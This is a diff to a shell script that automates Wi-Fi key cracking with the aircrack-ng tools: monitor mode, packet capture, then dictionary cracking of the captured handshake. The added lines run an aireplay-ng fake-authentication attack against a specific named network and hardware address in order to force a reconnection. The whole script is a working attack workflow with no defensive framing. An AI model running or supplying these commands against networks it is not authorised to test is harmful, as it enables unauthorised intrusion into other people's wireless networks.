@@ -17,10 +17,12 @@ sudo airmon-ng start ${wlan}
 
 # - Monitoring
 sudo airodump-ng -w ${label} ${wlan}mon
-
  # NOTE:
  # -c CHANNEL --bssid SSID
  # choose exact channel or SSID to snif
+
+# Try to force reconection by attack
+sudo aireplay-ng --fakeauth 0 -e Vodafone-E118 -a  78:6A:1F:54:02:FC ${wlan}mon
 
 # - Cracking
 aircrack-ng -w ${dict} ${label}-01.cap
